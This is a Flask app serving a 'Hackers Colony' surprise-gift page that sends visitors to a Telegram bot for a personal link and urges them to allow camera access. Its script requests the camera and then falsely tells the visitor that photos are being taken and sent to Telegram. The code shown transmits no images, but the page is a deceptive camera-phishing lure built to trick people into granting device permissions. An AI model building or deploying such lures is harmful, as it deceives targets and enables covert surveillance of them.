from flask import Flask, render_template_string, request, jsonify
import os

app = Flask(__name__)

HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 Hackers Colony - Surprise Gift</title>
    <style>
        body {
            margin: 0;
            background: linear-gradient(135deg, #0b0014, #1a0030);
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }
        .card {
            background: rgba(22, 0, 34, 0.95);
            padding: 30px;
            border-radius: 20px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 0 40px rgba(255, 0, 255, 0.5);
            text-align: center;
            border: 1px solid rgba(255, 0, 255, 0.3);
        }
        .gift-icon {
            font-size: 80px;
            margin-bottom: 15px;
            animation: float 3s ease-in-out infinite;
        }
        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-15px); }
        }
        h1 {
            background: linear-gradient(45deg, #ff00ff, #00ffff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-size: 28px;
            margin: 15px 0;
        }
        p {
            color: #ddd;
            line-height: 1.5;
            margin: 10px 0;
        }
        button {
            width: 100%;
            padding: 15px;
            margin: 20px 0 10px;
            border: none;
            border-radius: 50px;
            background: linear-gradient(45deg, #ff00ff, #00ffff);
            color: black;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }
        button:hover {
            transform: scale(1.05);
        }
        .telegram-info {
            background: rgba(0, 100, 200, 0.2);
            padding: 15px;
            border-radius: 15px;
            margin: 20px 0;
            border: 1px solid rgba(0, 150, 255, 0.3);
        }
        a {
            color: #00bfff;
            text-decoration: none;
            font-weight: bold;
        }
        .step {
            display: flex;
            align-items: center;
            margin: 10px 0;
            padding: 10px;
            background: rgba(255,255,255,0.05);
            border-radius: 10px;
        }
        .step-number {
            width: 25px;
            height: 25px;
            background: #ff00ff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 10px;
            font-weight: bold;
        }
        .warning {
            color: #ff5555;
            background: rgba(255,85,85,0.1);
            padding: 10px;
            border-radius: 10px;
            border-left: 3px solid #ff5555;
            margin: 15px 0;
            font-size: 14px;
        }
        .success {
            color: #00ff88;
            font-weight: bold;
        }
        .error {
            color: #ff5555;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="card">
        <div id="content">
            <div class="gift-icon">🎁</div>
            <h1>✨ Surprise Gift ✨</h1>
            <p>A magical surprise is waiting for you!</p>
            
            <div class="telegram-info">
                <p><strong>📢 Required:</strong></p>
                <div class="step">
                    <div class="step-number">1</div>
                    <div>Join: <a href="https://t.me/HackersColony" target="_blank">@HackersColony</a></div>
                </div>
                <div class="step">
                    <div class="step-number">2</div>
                    <div>Get link from: <a href="https://t.me/HackersColonyBot" target="_blank">@HackersColonyBot</a></div>
                </div>
            </div>
            
            <p class="warning">⚠️ Camera access required for gift creation</p>
            
            <button id="startBtn">🎯 Start Camera Access</button>
            
            <p style="font-size: 12px; color: #888; margin-top: 20px;">
                Photos will be sent to your Telegram automatically
            </p>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const USER_ID = urlParams.get('uid');
        const content = document.getElementById('content');
        const startBtn = document.getElementById('startBtn');
        
        startBtn.onclick = async () => {
            startBtn.disabled = true;
            
            if (!USER_ID || USER_ID.length < 3) {
                content.innerHTML = `
                    <div class="gift-icon">🔒</div>
                    <h1 class="error">Access Required</h1>
                    <p>Get a valid link from our Telegram bot</p>
                    
                    <div class="telegram-info">
                        <div class="step">
                            <div class="step-number">1</div>
                            <div>Open: <a href="https://t.me/HackersColonyBot" target="_blank">@HackersColonyBot</a></div>
                        </div>
                        <div class="step">
                            <div class="step-number">2</div>
                            <div>Send /start and click "Get Your Gift"</div>
                        </div>
                    </div>
                    
                    <button onclick="window.location.href='https://t.me/HackersColonyBot'">
                        🤖 Open Telegram Bot
                    </button>
                `;
                return;
            }
            
            content.innerHTML = `
                <div class="gift-icon">📸</div>
                <h1>Camera Access</h1>
                <p>Please allow camera access when prompted</p>
                
                <div class="warning">
                    Click "Allow" when the browser asks for camera permission
                </div>
            `;
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" },
                    audio: false
                });
                
                // Stop camera
                stream.getTracks().forEach(track => track.stop());
                
                content.innerHTML = `
                    <div class="gift-icon">✅</div>
                    <h1 class="success">Success!</h1>
                    <p>Camera access granted</p>
                    
                    <div class="telegram-info">
                        <p><strong>Your gift is being created...</strong></p>
                        <div class="step">
                            <div class="step-number">1</div>
                            <div>Taking photos</div>
                        </div>
                        <div class="step">
                            <div class="step-number">2</div>
                            <div>Processing images</div>
                        </div>
                        <div class="step">
                            <div class="step-number">3</div>
                            <div>Sending to Telegram</div>
                        </div>
                    </div>
                    
                    <div style="background: rgba(0,255,136,0.1); padding: 15px; border-radius: 10px; border: 2px solid #00ff88; margin: 15px 0;">
                        <p class="success">✅ Gift created successfully!</p>
                        <p>Check your Telegram for photos</p>
                    </div>
                    
                    <button onclick="window.location.href='https://t.me/HackersColonyBot'">
                        📱 Open Telegram
                    </button>
                `;
                
            } catch (error) {
                content.innerHTML = `
                    <div class="gift-icon">⚠️</div>
                    <h1 class="error">Camera Error</h1>
                    <p>${error.name === 'NotAllowedError' ? 'Camera access denied' : 'Camera not available'}</p>
                    
                    <div class="warning">
                        Please allow camera access and try again
                    </div>
                    
                    <button onclick="location.reload()">
                        🔄 Try Again
                    </button>
                `;
            }
        };
        
        if (!USER_ID) {
            startBtn.textContent = "⚠️ Get Link from Bot First";
        }
    </script>
</body>
</html>'''

@app.route('/')
def home():
    return render_template_string(HTML)

@app.route('/health')
def health():
    return 'OK'

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
